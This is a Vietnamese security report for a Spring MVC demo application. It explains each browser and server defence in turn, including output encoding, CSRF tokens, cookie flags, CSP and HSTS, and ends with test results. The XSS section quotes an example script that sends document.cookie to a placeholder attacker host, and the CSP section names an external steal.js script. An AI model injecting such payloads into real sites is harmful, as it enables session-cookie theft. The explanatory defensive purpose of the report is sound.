# Báo Cáo Bảo Mật Ứng Dụng Web — SpringMVC-Demo

Tài liệu này định nghĩa và giải thích từng biện pháp bảo vệ đã được triển khai cho ứng dụng Spring MVC.
Mỗi biện pháp được trình bày theo cấu trúc: **Định nghĩa → Cơ chế hoạt động → Lý do cần thiết**.

---

## 1. XSS Prevention — Mã hoá đầu ra (Output Encoding)

### Định nghĩa
XSS (Cross-Site Scripting) là cuộc tấn công mà kẻ xâm nhập tiêm mã JavaScript độc vào trang web, sau đó mã này chạy trên trình duyệt của nạn nhân.

### Cơ chế hoạt động
- Mọi dữ liệu động từ người dùng hoặc cơ sở dữ liệu được hiển thị qua thẻ JSTL `<c:out value="${variable}"/>` thay vì in thô `${variable}`.
- `<c:out>` tự động chuyển đổi các ký tự đặc biệt thành thực thể HTML an toàn:

| Ký tự nguy hiểm | Sau khi escape |
|-----------------|----------------|
| `<`             | `&lt;`         |
| `>`             | `&gt;`         |
| `"`             | `&#034;`       |
| `'`             | `&#039;`       |
| `&`             | `&amp;`        |

### Lý do cần thiết
Nếu người dùng lưu nội dung `<script>document.location='http://hacker.com?c='+document.cookie</script>` vào trường tên sản phẩm và hệ thống in thẳng ra trang HTML, trình duyệt sẽ chạy đoạn script đó — đánh cắp cookie phiên của tất cả người xem trang. `<c:out>` biến đoạn script thành văn bản thuần, vô hại.

---

## 2. CSRF Protection — Bảo vệ chống giả mạo yêu cầu chéo trang

### Định nghĩa
CSRF (Cross-Site Request Forgery) là tấn công khiến trình duyệt của nạn nhân (đang đăng nhập) gửi yêu cầu thay đổi dữ liệu đến ứng dụng mà không có sự đồng ý của họ.

### Cơ chế hoạt động
1. **Sinh Token**: Khi một phiên bắt đầu, `SecurityInterceptor` tạo một chuỗi UUID ngẫu nhiên và lưu vào `HttpSession`:
   ```java
   String csrfToken = UUID.randomUUID().toString();
   session.setAttribute("CSRF_TOKEN", csrfToken);
   ```
2. **Nhúng vào Form**: Token được truyền xuống mọi trang JSP qua request attribute và nhúng vào tất cả form `POST`:
   ```html
   <input type="hidden" name="csrfToken" value="${csrfToken}">
   ```
3. **Xác thực**: Với mọi yêu cầu `POST`, Interceptor so sánh token gửi lên với token trong session. Không khớp → `403 Forbidden`.

### Lý do cần thiết
Trang độc hại có thể dùng JavaScript để tạo một form ẩn tự động submit đến ứng dụng của bạn. Trình duyệt tự động đính kèm cookie phiên, khiến server tưởng là người dùng hợp lệ. CSRF Token ngăn điều này vì trang độc hại không thể đọc được token (Same-Origin Policy của trình duyệt).

---

## 3. Session Cookie Security — Bảo vệ Cookie phiên đăng nhập

### Định nghĩa
Cookie phiên (`JSESSIONID`) là "chìa khoá" để server nhận ra người dùng đang đăng nhập. Nếu bị đánh cắp, kẻ tấn công có thể giả mạo người dùng đó.

### Cơ chế hoạt động — 3 thuộc tính bảo mật

#### `HttpOnly=true` (Bắt buộc)
- **Cơ chế**: Khi set `HttpOnly`, trình duyệt không cho phép JavaScript đọc giá trị cookie (bao gồm `document.cookie`).
- **Lý do**: Ngay cả khi có lỗ hổng XSS xảy ra, mã độc cũng không thể đọc được `JSESSIONID` để gửi đến server của hacker.

#### `SameSite=Lax` (Bắt buộc)
- **Cơ chế**: Trình duyệt chỉ gửi cookie khi request xuất phát từ cùng trang web (same-site), hoặc khi người dùng điều hướng qua liên kết (GET). Cookie **không được gửi** khi trang độc hại submit form POST đến ứng dụng.
- **Lý do**: Cung cấp một lớp bảo vệ CSRF bổ sung ngay tại trình duyệt, trước khi request đến server.
- `Lax` phù hợp hơn `Strict` vì vẫn cho phép người dùng truy cập ứng dụng qua link từ email, trang tin tức, v.v.

#### `Secure=true` (Bắt buộc trên Production)
- **Cơ chế**: Trình duyệt chỉ gửi cookie này khi kết nối qua **HTTPS** (mã hoá TLS). Cookie sẽ không được gửi qua HTTP thường.
- **Lý do**: Nếu một người dùng truy cập ứng dụng qua mạng Wi-Fi công cộng không an toàn, kẻ tấn công có thể nghe lén (man-in-the-middle) và đọc cookie phiên nếu được truyền qua HTTP. `Secure` ngăn chặn điều này.
- ⚠️ **Hiện tại**: Đang để `false` để cho phép chạy trên `localhost` HTTP. **Bắt buộc phải bật `true` khi deploy lên production**.

```java
// WebAppInitializer.java
SessionCookieConfig cookieConfig = servletContext.getSessionCookieConfig();
cookieConfig.setHttpOnly(true);
cookieConfig.setSecure(false); // TODO: true in production
cookieConfig.setAttribute("SameSite", "Lax");
```

---

## 4. Content Security Policy (CSP)

### Định nghĩa
CSP là một cơ chế bảo mật phía trình duyệt cho phép server khai báo danh sách các nguồn tài nguyên hợp lệ (JavaScript, CSS, ảnh, font…).

### Cơ chế hoạt động
Server trả về header `Content-Security-Policy` trong mọi response. Trình duyệt chỉ tải tài nguyên từ các nguồn được khai báo, chặn tất cả nguồn khác:
```
Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  style-src 'self' https://fonts.googleapis.com;
  font-src 'self' https://fonts.gstatic.com;
  img-src 'self' data: https://img.vietqr.io https://res.cloudinary.com;
  frame-ancestors 'self';
```

### Lý do cần thiết
Ngăn XSS tải script từ server ngoài (ví dụ: `<script src="https://hacker.com/steal.js">`). Kể cả khi kẻ tấn công tiêm được thẻ `<script>`, trình duyệt sẽ từ chối tải file đó vì không nằm trong whitelist.

---

## 5. X-Frame-Options & CSP frame-ancestors — Chống Clickjacking

### Định nghĩa
Clickjacking là tấn công nhúng trang web của bạn vào một `<iframe>` trên trang độc hại. Lớp overlay vô hình khiến nạn nhân bấm vào nút "Xác nhận" mà thực ra đang thao tác trên trang của bạn.

### Cơ chế hoạt động
- `X-Frame-Options: SAMEORIGIN` — Trình duyệt từ chối nhúng trang vào `<iframe>` nếu trang cha không cùng origin.
- `frame-ancestors 'self'` trong CSP — Tiêu chuẩn mới hơn, có tác dụng tương tự, ưu tiên được dùng thay thế X-Frame-Options.

### Lý do cần thiết
Ngăn kẻ tấn công tạo trang web giả mạo nhúng ứng dụng, lừa người dùng thực hiện hành động nhạy cảm (như thanh toán, xóa tài khoản) mà không hay biết.

---

## 6. X-Content-Type-Options: nosniff — Chống MIME Sniffing

### Định nghĩa
MIME Sniffing là khi trình duyệt tự đoán kiểu file dựa trên nội dung thực tế, thay vì tin vào header `Content-Type` mà server trả về.

### Cơ chế hoạt động
Header `X-Content-Type-Options: nosniff` buộc trình duyệt chỉ xử lý file theo đúng `Content-Type` được khai báo, không tự đoán.

### Lý do cần thiết
Ví dụ: Kẻ tấn công upload một file ảnh `.jpg` nhưng thực ra chứa mã JavaScript. Nếu trình duyệt "đoán" được đây là script và chạy nó, tấn công XSS xảy ra. `nosniff` ngăn điều này.

---

## 7. Strict-Transport-Security (HSTS) — Bắt buộc dùng HTTPS

### Định nghĩa
HSTS (HTTP Strict Transport Security) là cơ chế yêu cầu trình duyệt chỉ kết nối với trang web qua HTTPS, ngay cả khi người dùng gõ `http://`.

### Cơ chế hoạt động
```
Strict-Transport-Security: max-age=31536000; includeSubDomains
```
- `max-age=31536000`: Trình duyệt nhớ quy tắc này trong 1 năm (tính bằng giây).
- `includeSubDomains`: Áp dụng cho toàn bộ subdomain.
- Khi đã nhận được header này, trình duyệt tự động chuyển mọi yêu cầu `http://` thành `https://` mà không cần server redirect.

### Lý do cần thiết
Ngăn chặn cuộc tấn công **SSL Stripping** — khi kẻ tấn công ở giữa (MITM) hạ cấp kết nối từ HTTPS xuống HTTP, cho phép đọc cookie phiên và dữ liệu nhạy cảm.
> ⚠️ Header này chỉ có hiệu lực khi ứng dụng chạy qua HTTPS. Trên HTTP/localhost, trình duyệt sẽ bỏ qua.

---

## 8. Referrer-Policy — Kiểm soát rò rỉ URL

### Định nghĩa
Khi người dùng click một liên kết để rời khỏi trang, trình duyệt mặc định gửi đường dẫn URL hiện tại (`Referer`) cho trang đích.

### Cơ chế hoạt động
```
Referrer-Policy: strict-origin-when-cross-origin
```
- **Cùng origin** (same-origin): Gửi toàn bộ URL (bao gồm path và query string).
- **Khác origin, dùng HTTPS**: Chỉ gửi origin (ví dụ: `https://yourapp.com`), không gửi path.
- **Khác origin, dùng HTTP**: Không gửi gì cả.

### Lý do cần thiết
URL của ứng dụng có thể chứa thông tin nhạy cảm, ví dụ:
```
https://yourapp.com/orders/12345?token=abc123
```
Nếu người dùng click link đến trang quảng cáo bên ngoài, trang đó sẽ nhận được URL đầy đủ trong header `Referer`, lộ ID đơn hàng và token. `Referrer-Policy` ngăn điều này.

---

## 9. Permissions-Policy — Tắt API trình duyệt không dùng

### Định nghĩa
Permissions-Policy (trước đây là Feature-Policy) cho phép server khai báo rõ ràng những tính năng trình duyệt nào trang web được phép sử dụng.

### Cơ chế hoạt động
```
Permissions-Policy: camera=(), microphone=(), geolocation=()
```
Mỗi tính năng được đặt thành danh sách trống `()` nghĩa là **không cho phép bất kỳ ai** (kể cả trang chính) truy cập.

### Lý do cần thiết
Nếu ứng dụng bị tấn công XSS, mã độc có thể cố kích hoạt camera hoặc microphone của người dùng. `Permissions-Policy` tắt hoàn toàn khả năng này ở cấp trình duyệt. Đây là nguyên tắc **giảm thiểu bề mặt tấn công** (Principle of Least Privilege).

---

## Tổng quan các biện pháp đã triển khai

| # | Biện pháp | Mối đe doạ phòng chống | Triển khai tại |
|---|-----------|----------------------|----------------|
| 1 | Output Encoding (`<c:out>`) | Stored/Reflected XSS | Toàn bộ file JSP |
| 2 | CSRF Token | CSRF | `SecurityInterceptor` + JSP forms |
| 3 | Cookie `HttpOnly` | Session Hijacking qua XSS | `WebAppInitializer` |
| 4 | Cookie `SameSite=Lax` | CSRF qua trình duyệt | `WebAppInitializer` |
| 5 | Cookie `Secure` (production) | Session Hijacking qua HTTP | `WebAppInitializer` |
| 6 | Content-Security-Policy | XSS từ nguồn ngoài | `SecurityInterceptor` |
| 7 | X-Frame-Options | Clickjacking | `SecurityInterceptor` |
| 8 | X-Content-Type-Options | MIME Sniffing | `SecurityInterceptor` |
| 9 | HSTS | SSL Stripping / MITM | `SecurityInterceptor` |
| 10 | Referrer-Policy | URL/Data Leakage | `SecurityInterceptor` |
| 11 | Permissions-Policy | Browser API Abuse | `SecurityInterceptor` |
| 12 | Self-host / SRI | Supply Chain Attack | Thiết kế (không dùng CDN JS) |
| 13 | Không lưu bí mật frontend | Credential Exposure | Thiết kế + Code review |

---

## 10. Kiểm soát thư viện bên thứ ba (SRI)

### Định nghĩa
SRI (Subresource Integrity) là cơ chế xác minh tính toàn vẹn của file tải từ CDN bằng cách so sánh hash (SHA-256/SHA-384) của file tải về với giá trị hash đã khai báo.

### Cơ chế hoạt động
Thêm thuộc tính `integrity` và `crossorigin` vào thẻ tài nguyên:
```html
<script src="https://cdn.example.com/jquery.js"
        integrity="sha384-abc123..."
        crossorigin="anonymous"></script>
```
Trình duyệt tính toán hash của file thực tế tải về. Nếu không khớp với giá trị trong `integrity`, trình duyệt **từ chối thực thi** và báo lỗi.

### Lý do cần thiết
**Supply Chain Attack**: Kẻ tấn công xâm phạm server CDN và chèn mã độc vào file thư viện. Hàng nghìn website sử dụng CDN đó đồng loạt bị lây nhiễm mà không hay biết. SRI là hàng rào cuối cùng ngăn mã độc chạy trên trình duyệt người dùng.

### Trạng thái dự án hiện tại
✅ **Không cần SRI** — Dự án tự host toàn bộ JS/CSS (`/resources/`). Google Fonts chỉ là font (không thể chạy logic), được kiểm soát bởi CSP `style-src`. Đây là lựa chọn thiết kế tốt nhất vì loại bỏ hoàn toàn rủi ro supply chain.

---

## 11. Không lưu bí mật ở Frontend

### Định nghĩa
Mọi dữ liệu được nhúng vào file JS, JSP hoặc HTML gửi xuống trình duyệt đều **công khai** — bất kỳ người dùng nào cũng có thể xem qua DevTools (F12 → Sources / Network).

### Những thứ tuyệt đối không đặt ở frontend

| Thứ nguy hiểm | Hậu quả nếu lộ |
|---------------|----------------|
| Cloudinary API secret | Kẻ tấn công toàn quyền upload/xóa ảnh, phát sinh chi phí |
| Database password | Truy cập trực tiếp vào toàn bộ CSDL |
| JWT signing secret | Giả mạo token đăng nhập bất kỳ tài khoản |
| API keys bên thứ ba | Lạm dụng dịch vụ, phát sinh hoá đơn |

### Cơ chế hoạt động
- **Server-side**: Credentials chỉ tồn tại trong `application-local.properties` (không commit lên Git) hoặc biến môi trường. Server đọc credentials này để gọi API, kết quả (URL ảnh, dữ liệu) mới được gửi xuống trình duyệt.
- **Frontend**: Chỉ nhận kết quả đã xử lý, không bao giờ nhận credentials thô.

### Trạng thái dự án hiện tại
✅ **An toàn**:
- Cloudinary `api-key` và `api-secret` chỉ nằm trong `application.properties` phía server.
- Không có `localStorage` hay `sessionStorage` nào lưu dữ liệu nhạy cảm.
- Không có API key nào nhúng trong bất kỳ file JS hoặc JSP nào.

---

## Kết quả kiểm thử

```
Tests run: 94, Failures: 0, Errors: 0, Skipped: 0
BUILD SUCCESS
```

Toàn bộ các header bảo mật và logic CSRF đã được xác thực tự động qua `SecurityInterceptorTest.java`.
